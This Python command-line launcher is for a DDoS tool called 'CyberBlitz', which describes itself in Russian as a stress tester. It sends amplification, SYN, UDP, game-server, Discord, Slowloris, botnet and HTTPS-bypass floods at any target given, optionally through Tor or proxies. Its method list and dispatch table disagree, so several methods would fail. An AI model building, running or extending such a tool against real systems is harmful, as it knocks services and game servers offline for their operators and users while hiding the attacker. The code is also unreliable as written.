import click
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from config import update_config, CONFIG
from attacks.layer4 import AMPAttack, TCPAttack, UDPAttack, GameAttack, SpecialAttack, SlowLorisAttack
from attacks.layer7 import HTTPAttack, BrowserAttack, get_locust_attack
from attacks.botnet import BotnetAttack
import asyncio
import time

console = Console()

@click.group()
def cli():
    """CyberBlitz - Мощный стресс-тестер для тестировщиков"""
    pass

@cli.command()
@click.option('--target', required=True, help='Цель атаки (IP или URL)')
@click.option('--port', type=int, default=80, help='Порт атаки')
@click.option('--method', required=True, type=str, help='Метод атаки (NTP, TCP-SYN, HTTPS-FLOODER, SLOWLORIS и т.д.)')
@click.option('--threads', type=int, default=50, help='Количество потоков')
@click.option('--duration', type=int, default=60, help='Длительность атаки (сек)')
@click.option('--use-tor', is_flag=True, help='Использовать Tor')
@click.option('--tor-lib', type=click.Choice(['torpy', 'torsocks']), default='torpy', help='Библиотека Tor')
@click.option('--use-proxy', is_flag=True, help='Использовать прокси')
@click.option('--browser', type=click.Choice(['none', 'selenium', 'playwright']), default='none', help='Браузер для атак')
@click.option('--clicks', is_flag=True, help='Включить клики в браузере')
@click.option('--scroll', is_flag=True, help='Включить прокрутку в браузере')
@click.option('--delay', type=float, default=1.0, help='Задержка между действиями браузера (сек)')

def attack(target, port, method, threads, duration, use_tor, tor_lib, use_proxy, browser, clicks, scroll, delay):
    """Запуск атаки"""
    valid_methods = [
        'NTP', 'STUN', 'DNS', 'WSD', 'SADP',
        'TCP-ACK', 'TCP-SYN', 'TCP-BYPASS', 'OVH-TCP',
        'UDP', 'UDP-VSE', 'UDP-BYPASS',
        'GAME', 'GAME-MC', 'GAME-WARZONE', 'GAME-R6', 'FIVEM-KILL',
        'SSH-AUTH', 'GAME-KILL', 'TCP-SOCKET', 'DISCORD', 'SLOWLORIS',
        'UDPBYPASS-BOT', 'OVH-HTTP', 'GREBOT-BOT', 'TCPBOT-BOT',
        'HTTPS-FLOODER', 'HTTPS-BYPASS', 'HTTP-BROWSER', 'HTTPS-ARTERMIS', 'LOCUST-HTTP'
    ]
    if method not in valid_methods:
        console.print(f"[red]Ошибка: Метод '{method}' не поддерживается. Доступные методы: {', '.join(valid_methods)}[/red]")
        return

    if threads > 50 and browser in ['selenium', 'playwright']:
        console.print(f"[yellow]Предупреждение: Высокое количество threads ({threads}) для {browser} может перегрузить систему. Рекомендуется до 50 threads.[/yellow]")

    update_config(
        target_ip=target, target_url=target, port=port, threads=threads, duration=duration,
        use_tor=use_tor, tor_library=tor_lib, use_proxy=use_proxy, use_browser=browser,
        browser_behavior={"clicks": clicks, "scroll": scroll, "delay": delay}
    )

    attack_methods = {
        'NTP': AMPAttack, 'STUN': AMPAttack, 'DNS': AMPAttack, 'WSD': AMPAttack, 'SADP': AMPAttack,
        'TCP-ACK': TCPAttack, 'TCP-SYN': TCPAttack, 'TCP-BYPASS': TCPAttack, 'OVH-TCP': TCPAttack,
        'UDP': UDPAttack, 'UDP-VSE': UDPAttack, 'UDP-BYPASS': UDPAttack,
        'GAME': GameAttack, 'GAME-MC': GameAttack, 'GAME-WARZONE': GameAttack, 'GAME-R6': GameAttack, 'FIVEM-KILL': GameAttack,
        'SSH': SpecialAttack, 'GAME-KILL': GameAttack,
        'TCP-SOCKET': SpecialAttack, 'DISCORD': SpecialAttack,
        'SLOWLORIS': SlowLorisAttack,
        'UDPBYPASS-BOT': BotnetAttack, 'OVH-HEX': BotnetAttack, 'GREBOT': BotnetAttack, 'TCPBOT': BotnetAttack,
        'HTTPS-FLOODER': HTTPAttack, 'HTTPS-BYPASS': HTTPAttack, 'HTTP-BROWSER': HTTPAttack, 'HTTPS-ARTERMIS': HTTPAttack,
        'LOCUST': get_locust_attack()
    }

    with Progress() as progress:
        task = progress.add_task(f"[cyan]Запуск {method} атаки...", total=duration)
        start_time = time.time()
        try:
            if method in ['HTTPS-FLOODER', 'HTTPS-BYPASS', 'HTTP-BROWSER', 'HTTPS-ARTERMIS']:
                if CONFIG['use_browser'] != 'none':
                    attack = BrowserAttack(CONFIG['target_url'], CONFIG['duration'], method)
                else:
                    attack = attack_methods[method](CONFIG['target_url'], CONFIG['duration'], method)
                asyncio.run(attack.run())
            elif method == 'LOCUST':
                attack = attack_methods[method](CONFIG['target_url'], CONFIG['duration'], method)
                attack.run()
            else:
                attack = attack_methods[method](CONFIG['target_ip'], CONFIG['port'], method, CONFIG['duration'])
                attack.run()
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                progress.update(task, completed=elapsed)
                time.sleep(1)
        except Exception as e:
            console.print(f"[red]Ошибка при выполнении атаки: {e}[/red]")
        progress.update(task, completed=duration)
    
    table = Table(title="Результат атаки")
    table.add_column("Параметр", style="cyan")
    table.add_column("Значение", style="magenta")
    table.add_row("Цель", target)
    table.add_row("Метод", method)
    table.add_row("Длительность", f"{duration} сек")
    table.add_row("Tor", str(use_tor))
    table.add_row("Прокси", str(use_proxy))
    table.add_row("Браузер", browser)
    console.print(table)

if __name__ == "__main__":
    cli()